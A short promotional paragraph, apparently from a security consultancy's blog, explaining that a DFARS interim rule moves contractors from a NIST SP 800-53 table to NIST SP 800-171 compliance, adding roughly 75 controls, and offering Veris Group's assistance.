<p>The biggest takeaway from this interim rule is the change from the NIST SP 800-53 table that was in the prior DFARS rule to now complying with NIST SP 800-171. This change adds around 75 controls, and will increase the level of effort required for a compliance assessment. If you think your company is subject to this clause, may need to comply with NIST SP 800-171, or have other questions regarding system security, Veris Group can help.</p>
